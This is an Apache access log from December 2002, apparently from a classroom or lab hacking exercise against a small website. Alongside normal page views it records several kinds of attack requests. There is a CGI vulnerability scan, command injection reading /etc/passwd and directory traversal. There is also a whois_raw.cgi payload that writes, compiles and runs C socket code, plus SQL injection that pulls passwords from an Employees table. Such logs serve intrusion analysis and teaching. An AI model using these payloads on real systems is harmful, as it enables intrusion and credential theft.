128.111.43.38 - - [06/Dec/2002:12:15:06 -0800] "GET / HTTP/1.1" 200 1494 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)"
128.111.43.38 - - [06/Dec/2002:12:15:06 -0800] "GET /basstard.css HTTP/1.1" 200 793 "http://128.111.48.15/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)"
128.111.43.38 - - [06/Dec/2002:12:15:06 -0800] "GET /basstard_title.png HTTP/1.1" 200 5316 "http://128.111.48.15/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)"
128.111.43.38 - - [06/Dec/2002:12:15:06 -0800] "GET /basstard.png HTTP/1.1" 200 18660 "http://128.111.48.15/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)"
128.111.43.25 - - [06/Dec/2002:12:15:18 -0800] "GET /cgi-bin/save_message.pl?first=jon%59cat%20/etc/passwd HTTP/1.1" 200 680 "-" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.32 - - [06/Dec/2002:12:15:31 -0800] "GET /cgi-bin/checkperl.pl?file=query_extension.pl HTTP/1.1" 200 44 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.2) Gecko/20021126"
128.111.43.25 - - [06/Dec/2002:12:15:39 -0800] "GET /cgi-bin/save_message.pl?first=jon%3bcat%20/etc/passwd HTTP/1.1" 200 680 "-" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.61 - - [06/Dec/2002:12:15:41 -0800] "HEAD / HTTP/1.0" 200 0 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:44 -0800] "GET /cgi-bin/unlg1.1 HTTP/1.0" 404 275 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:44 -0800] "GET /cgi-bin/rwwwshell.pl HTTP/1.0" 404 280 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:44 -0800] "GET /cgi-bin/phf HTTP/1.0" 404 271 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:44 -0800] "GET /cgi-bin/Count.cgi HTTP/1.0" 404 277 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:44 -0800] "GET /cgi-bin/test-cgi HTTP/1.0" 404 276 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:44 -0800] "GET /cgi-bin/nph-test-cgi HTTP/1.0" 404 280 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:44 -0800] "GET /cgi-bin/nph-publish HTTP/1.0" 404 279 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:44 -0800] "GET /cgi-bin/php.cgi HTTP/1.0" 404 275 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:44 -0800] "GET /cgi-bin/handler HTTP/1.0" 404 275 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:44 -0800] "GET /cgi-bin/webgais HTTP/1.0" 404 275 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:44 -0800] "GET /cgi-bin/websendmail HTTP/1.0" 404 279 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:44 -0800] "GET /cgi-bin/webdist.cgi HTTP/1.0" 404 279 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:44 -0800] "GET /cgi-bin/faxsurvey HTTP/1.0" 404 277 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:44 -0800] "GET /cgi-bin/htmlscript HTTP/1.0" 404 278 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:44 -0800] "GET /cgi-bin/pfdispaly.cgi HTTP/1.0" 404 281 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:44 -0800] "GET /cgi-bin/perl.exe HTTP/1.0" 404 276 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:44 -0800] "GET /cgi-bin/wwwboard.pl HTTP/1.0" 404 279 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:44 -0800] "GET /cgi-bin/www-sql HTTP/1.0" 404 275 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:44 -0800] "GET /cgi-bin/view-source HTTP/1.0" 404 279 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cgi-bin/campas HTTP/1.0" 404 274 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cgi-bin/aglimpse HTTP/1.0" 404 276 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cgi-bin/glimpse HTTP/1.0" 404 275 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cgi-bin/man.sh HTTP/1.0" 404 274 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cgi-bin/AT-admin.cgi HTTP/1.0" 404 280 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cgi-bin/filemail.pl HTTP/1.0" 404 279 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cgi-bin/maillist.pl HTTP/1.0" 404 279 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cgi-bin/jj HTTP/1.0" 404 270 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cgi-bin/info2www HTTP/1.0" 404 276 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cgi-bin/files.pl HTTP/1.0" 404 276 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cgi-bin/finger HTTP/1.0" 404 274 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cgi-bin/bnbform.cgi HTTP/1.0" 404 279 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cgi-bin/survey.cgi HTTP/1.0" 404 278 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cgi-bin/AnyForm2 HTTP/1.0" 404 276 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cgi-bin/textcounter.pl HTTP/1.0" 404 282 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cgi-bin/classifieds.cgi HTTP/1.0" 404 283 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cgi-bin/environ.cgi HTTP/1.0" 404 279 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cgi-bin/wrap HTTP/1.0" 404 272 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cgi-bin/cgiwrap HTTP/1.0" 404 275 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cgi-bin/guestbook.cgi HTTP/1.0" 404 281 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cgi-bin/edit.pl HTTP/1.0" 404 275 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cgi-bin/perlshop.cgi HTTP/1.0" 404 280 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /_vti_inf.html HTTP/1.0" 404 273 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /_vti_pvt/service.pwd HTTP/1.0" 404 280 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /_vti_pvt/users.pwd HTTP/1.0" 404 278 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /_vti_pvt/authors.pwd HTTP/1.0" 404 280 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /_vti_pvt/administrators.pwd HTTP/1.0" 404 287 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /_vti_bin/shtml.dll HTTP/1.0" 404 278 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /_vti_bin/shtml.exe HTTP/1.0" 404 278 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cgi-dos/args.bat HTTP/1.0" 404 276 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cgi-win/uploader.exe HTTP/1.0" 404 280 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cgi-bin/rguest.exe HTTP/1.0" 404 278 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cgi-bin/wguest.exe HTTP/1.0" 404 278 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /scripts/issadmin/bdir.htr HTTP/1.0" 404 285 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /scripts/CGImail.exe HTTP/1.0" 404 279 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /scripts/tools/newdsn.exe HTTP/1.0" 404 284 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /scripts/fpcount.exe HTTP/1.0" 404 279 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cfdocs/expelval/openfile.cfm HTTP/1.0" 404 288 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cfdocs/expelval/exprcalc.cfm HTTP/1.0" 404 288 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cfdocs/expelval/displayopenedfile.cfm HTTP/1.0" 404 297 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /cfdocs/expelval/sendmail.cfm HTTP/1.0" 404 288 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /iissamples/exair/howitworks/codebrws.asp HTTP/1.0" 404 300 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /iissamples/sdk/asp/docs/codebrws.asp HTTP/1.0" 404 296 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /msads/Samples/SELECTOR/showcode.asp HTTP/1.0" 404 295 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /search97.vts HTTP/1.0" 404 272 "-" "-"
128.111.43.61 - - [06/Dec/2002:12:15:45 -0800] "GET /carbo.dll HTTP/1.0" 404 269 "-" "-"
128.111.43.65 - - [06/Dec/2002:12:16:02 -0800] "GET / HTTP/1.0" 200 1494 "-" "Lynx/2.8.4rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.6b"
128.111.43.25 - - [06/Dec/2002:12:16:05 -0800] "GET /cgi-bin/save_message.pl?first=jon/../../../../../etc/passwd HTTP/1.1" 200 690 "-" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.32 - - [06/Dec/2002:12:16:08 -0800] "GET /cgi-bin/checkperl.pl?query_extension.pl HTTP/1.1" 200 818 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.2) Gecko/20021126"
128.111.43.65 - - [06/Dec/2002:12:16:09 -0800] "GET /history.html HTTP/1.0" 200 1226 "http://128.111.48.15/" "Lynx/2.8.4rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.6b"
128.111.43.58 - - [06/Dec/2002:12:16:10 -0800] "GET /basstard.png HTTP/1.0" 200 18660 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.65 - - [06/Dec/2002:12:16:13 -0800] "GET /financial.html HTTP/1.0" 200 1369 "http://128.111.48.15/history.html" "Lynx/2.8.4rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.6b"
128.111.43.65 - - [06/Dec/2002:12:16:16 -0800] "GET /contact.html HTTP/1.0" 200 1286 "http://128.111.48.15/" "Lynx/2.8.4rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.6b"
128.111.20.70 - - [06/Dec/2002:12:16:33 -0800] "GET / HTTP/1.1" 200 1494 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)"
128.111.20.70 - - [06/Dec/2002:12:16:33 -0800] "GET /basstard.css HTTP/1.1" 200 793 "http://128.111.48.15/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)"
128.111.20.70 - - [06/Dec/2002:12:16:33 -0800] "GET /basstard_title.png HTTP/1.1" 200 5316 "http://128.111.48.15/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)"
128.111.20.70 - - [06/Dec/2002:12:16:33 -0800] "GET /basstard.png HTTP/1.1" 200 18660 "http://128.111.48.15/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)"
128.111.43.65 - - [06/Dec/2002:12:16:34 -0800] "GET / HTTP/1.0" 200 1494 "-" "Lynx/2.8.4rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.6b"
128.111.43.65 - - [06/Dec/2002:12:16:35 -0800] "GET /contact.html HTTP/1.0" 200 1286 "http://128.111.48.15/" "Lynx/2.8.4rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.6b"
128.111.43.58 - - [06/Dec/2002:12:16:37 -0800] "GET / HTTP/1.0" 200 1494 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.25 - - [06/Dec/2002:12:16:39 -0800] "GET /cgi-bin/save_message.pl?first=/../../../../../etc/passwd HTTP/1.1" 200 687 "-" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.65 - - [06/Dec/2002:12:16:52 -0800] "GET / HTTP/1.0" 200 1494 "-" "Wget/1.8.1"
128.111.43.65 - - [06/Dec/2002:12:17:15 -0800] "GET /contact.html HTTP/1.0" 200 1286 "-" "Wget/1.8.1"
128.111.43.65 - - [06/Dec/2002:12:17:34 -0800] "GET /feedback.html HTTP/1.0" 200 1307 "-" "Wget/1.8.1"
128.111.43.72 - - [06/Dec/2002:12:17:38 -0800] "GET / HTTP/1.1" 200 1494 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.72 - - [06/Dec/2002:12:17:39 -0800] "GET /basstard.css HTTP/1.1" 200 793 "http://128.111.48.15/" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.72 - - [06/Dec/2002:12:17:39 -0800] "GET /basstard_title.png HTTP/1.1" 200 5316 "http://128.111.48.15/" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.72 - - [06/Dec/2002:12:17:39 -0800] "GET /basstard.png HTTP/1.1" 200 18660 "http://128.111.48.15/" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.61 - - [06/Dec/2002:12:17:55 -0800] "GET /cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd" 404 - "-" "-"
128.111.43.25 - - [06/Dec/2002:12:17:58 -0800] "GET /cgi-bin/save_message.pl?first=%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1" 200 678 "-" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.65 - - [06/Dec/2002:12:18:08 -0800] "GET / HTTP/1.0" 200 1494 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.65 - - [06/Dec/2002:12:18:08 -0800] "GET /basstard.css HTTP/1.0" 200 793 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.65 - - [06/Dec/2002:12:18:08 -0800] "GET /basstard_title.png HTTP/1.0" 200 5316 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.65 - - [06/Dec/2002:12:18:08 -0800] "GET /basstard.png HTTP/1.0" 200 18660 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.65 - - [06/Dec/2002:12:18:12 -0800] "GET /feedback.html HTTP/1.0" 200 1307 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.20.70 - - [06/Dec/2002:12:18:13 -0800] "GET /contact.html HTTP/1.1" 200 1286 "http://128.111.48.15/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)"
128.111.20.70 - - [06/Dec/2002:12:18:13 -0800] "GET /basstard.css HTTP/1.1" 304 - "http://128.111.48.15/contact.html" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)"
128.111.20.70 - - [06/Dec/2002:12:18:13 -0800] "GET /basstard_title.png HTTP/1.1" 304 - "http://128.111.48.15/contact.html" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)"
128.111.43.65 - - [06/Dec/2002:12:18:14 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt HTTP/1.0" 200 599 "http://128.111.48.15/feedback.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.61 - - [06/Dec/2002:12:18:19 -0800] "-" 408 - "-" "-"
128.111.43.72 - - [06/Dec/2002:12:18:20 -0800] "GET /contact.html HTTP/1.1" 200 1286 "http://128.111.48.15/" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.65 - - [06/Dec/2002:12:18:27 -0800] "GET /contact.html HTTP/1.0" 200 1286 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.72 - - [06/Dec/2002:12:18:29 -0800] "GET /history.html HTTP/1.1" 200 1226 "http://128.111.48.15/" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.25 - - [06/Dec/2002:12:18:31 -0800] "GET /cgi-bin/save_message.pl?first=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1" 200 681 "-" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.65 - - [06/Dec/2002:12:18:36 -0800] "GET /cgi-bin/query_extension.pl?cboname=tard HTTP/1.0" 200 309 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.61 - - [06/Dec/2002:12:18:40 -0800] "GET cgi-bin/php.cgi?/etc/passwd" 400 - "-" "-"
128.111.43.58 - - [06/Dec/2002:12:18:45 -0800] "GET /feedback.html HTTP/1.0" 200 1307 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:12:18:57 -0800] "POST /cgi-bin/save_message.pl HTTP/1.0" 200 633 "http://128.111.48.15/feedback.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.72 - - [06/Dec/2002:12:18:58 -0800] "GET /financial.html HTTP/1.1" 200 1369 "http://128.111.48.15/history.html" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.65 - - [06/Dec/2002:12:18:58 -0800] "GET /cgi-bin/query_extension.pl HTTP/1.0" 200 301 "-" "Wget/1.8.1"
128.111.43.25 - - [06/Dec/2002:12:19:04 -0800] "GET /cgi-bin/save_message.pl?last=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1" 200 681 "-" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.61 - - [06/Dec/2002:12:19:10 -0800] "GET /cgi-bin/whois_raw.cgi?fqdn=%0aecho%20%27%23%69%6e%63%6c%75%64%65%20%22%2f%75%73%72%2f%69%6e%63%6c%75%64%65%2f%7" 404 - "-" "-"
128.111.43.61 - - [06/Dec/2002:12:19:10 -0800] "GET /cgi-bin/whois_raw.cgi?fqdn=%0aecho%20%27%23%69%6e%63%6c%75%64%65%20%22%2f%75%73%72%2f%69%6e%63%6c%75%64%65%2f%6" 404 - "-" "-"
128.111.43.61 - - [06/Dec/2002:12:19:10 -0800] "GET /cgi-bin/whois_raw.cgi?fqdn=%0aecho%20%27%69%6e%74%20%6d%61%69%6e%28%29%7b%73%74%72%75%63%74%20%73%6f%63%6b%61" 404 - "-" "-"
128.111.43.61 - - [06/Dec/2002:12:19:10 -0800] "GET /cgi-bin/whois_raw.cgi?fqdn=%0agcc%20-o%20hi%20hi.c" 404 - "-" "-"
128.111.43.61 - - [06/Dec/2002:12:19:10 -0800] "GET /cgi-bin/whois_raw.cgi?fqdn=%0a%2e%2f%68%69%20" 404 - "-" "-"
128.111.43.58 - - [06/Dec/2002:12:19:11 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt HTTP/1.0" 200 599 "http://128.111.48.15/cgi-bin/save_message.pl" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.65 - - [06/Dec/2002:12:19:15 -0800] "GET /cgi-bin/formmail.pl HTTP/1.0" 404 279 "-" "Wget/1.8.1"
128.111.43.25 - - [06/Dec/2002:12:19:18 -0800] "GET /cgi-bin/save_message.pl?comment=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1" 200 661 "-" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.61 - - [06/Dec/2002:12:19:39 -0800] "GET /cgi-bin/whois_raw.cgi?fqdn=%0aecho%20%27%23%69%6e%63%6c%75%64%65%20%22%2f%75%73%72%2f%69%6e%63%6c%75%64%65%2f%7" 404 - "-" "-"
128.111.43.61 - - [06/Dec/2002:12:19:39 -0800] "GET /cgi-bin/whois_raw.cgi?fqdn=%0aecho%20%27%23%69%6e%63%6c%75%64%65%20%22%2f%75%73%72%2f%69%6e%63%6c%75%64%65%2f%6" 404 - "-" "-"
128.111.43.61 - - [06/Dec/2002:12:19:39 -0800] "GET /cgi-bin/whois_raw.cgi?fqdn=%0aecho%20%27%69%6e%74%20%6d%61%69%6e%28%29%7b%73%74%72%75%63%74%20%73%6f%63%6b%61" 404 - "-" "-"
128.111.43.61 - - [06/Dec/2002:12:19:39 -0800] "GET /cgi-bin/whois_raw.cgi?fqdn=%0agcc%20-o%20hi%20hi.c" 404 - "-" "-"
128.111.43.61 - - [06/Dec/2002:12:19:39 -0800] "GET /cgi-bin/whois_raw.cgi?fqdn=%0a%2e%2f%68%69%20" 404 - "-" "-"
128.111.43.25 - - [06/Dec/2002:12:19:46 -0800] "GET /cgi-bin/save_message.pl?comment=%3bcat%20%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1" 200 661 "-" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.73 - - [06/Dec/2002:12:19:49 -0800] "GET / HTTP/1.0" 200 1494 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:19:50 -0800] "GET /basstard_title.png HTTP/1.0" 200 5316 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:19:50 -0800] "GET /basstard.png HTTP/1.0" 200 18660 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.25 - - [06/Dec/2002:12:20:01 -0800] "GET /cgi-bin/save_message.pl?last=%3bcat%20%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1" 200 686 "-" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.73 - - [06/Dec/2002:12:20:08 -0800] "GET /feedback.html HTTP/1.0" 200 1307 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.25 - - [06/Dec/2002:12:20:09 -0800] "GET /cgi-bin/save_message.pl?last=gfas%3bcat%20%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1" 200 690 "-" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.73 - - [06/Dec/2002:12:20:17 -0800] "GET /contact.html HTTP/1.0" 200 1286 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.32 - - [06/Dec/2002:12:20:18 -0800] "GET /checkperl.pl HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.2) Gecko/20021126"
128.111.43.32 - - [06/Dec/2002:12:20:25 -0800] "GET /cgi-bin/query_extension.pl?cboname=Schmidt HTTP/1.1" 200 349 "http://128.111.48.15/contact.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.2) Gecko/20021126"
128.111.43.32 - - [06/Dec/2002:12:20:41 -0800] "GET /cgi-bin/query_extension.pl?cboname=Tard HTTP/1.1" 200 321 "http://128.111.48.15/contact.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.2) Gecko/20021126"
128.111.43.32 - - [06/Dec/2002:12:20:48 -0800] "GET /cgi-bin/query_extension.pl?cboname=Joe+Joestar HTTP/1.1" 200 335 "http://128.111.48.15/contact.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.2) Gecko/20021126"
128.111.43.25 - - [06/Dec/2002:12:21:07 -0800] "GET /cgi-bin/save_message.pl?/* HTTP/1.1" 200 661 "-" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.25 - - [06/Dec/2002:12:21:26 -0800] "GET / HTTP/1.1" 200 1494 "-" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.25 - - [06/Dec/2002:12:21:32 -0800] "GET /contact.html HTTP/1.1" 200 1286 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.73 - - [06/Dec/2002:12:21:34 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27 HTTP/1.0" 200 293 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:21:38 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27%27 HTTP/1.0" 200 313 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:21:41 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27-- HTTP/1.0" 200 297 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.32 - - [06/Dec/2002:12:21:54 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%27 HTTP/1.1" 200 1250 "http://128.111.48.15/contact.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.2) Gecko/20021126"
128.111.43.25 - - [06/Dec/2002:12:23:09 -0800] "GET /cgi-bin/query_extension.pl?cboname=%3bcat%20/etc/passwd%3b HTTP/1.1" 200 347 "-" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.73 - - [06/Dec/2002:12:23:14 -0800] "POST /cgi-bin/save_message.pl HTTP/1.0" 200 633 "http://128.111.48.15/feedback.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:23:16 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt HTTP/1.0" 200 599 "http://128.111.48.15/cgi-bin/save_message.pl" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.72 - - [06/Dec/2002:12:23:17 -0800] "GET /contact.html HTTP/1.1" 304 - "http://128.111.48.15/" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.73 - - [06/Dec/2002:12:23:21 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt HTTP/1.0" 200 599 "http://128.111.48.15/cgi-bin/save_message.pl" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.25 - - [06/Dec/2002:12:23:25 -0800] "GET /cgi-bin/query_extension.pl?cboname=jon%3bcat%20/etc/passwd%3b HTTP/1.1" 200 353 "-" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.73 - - [06/Dec/2002:12:23:29 -0800] "POST /cgi-bin/save_message.pl HTTP/1.0" 200 633 "http://128.111.48.15/feedback.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:23:35 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt HTTP/1.0" 200 599 "http://128.111.48.15/cgi-bin/save_message.pl" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.72 - - [06/Dec/2002:12:23:41 -0800] "GET /feedback.html HTTP/1.1" 200 1307 "http://128.111.48.15/" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.32 - - [06/Dec/2002:12:23:41 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27%3B+select+pass+as+extension+from+Employees%3B%27 HTTP/1.1" 200 395 "http://128.111.48.15/contact.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.2) Gecko/20021126"
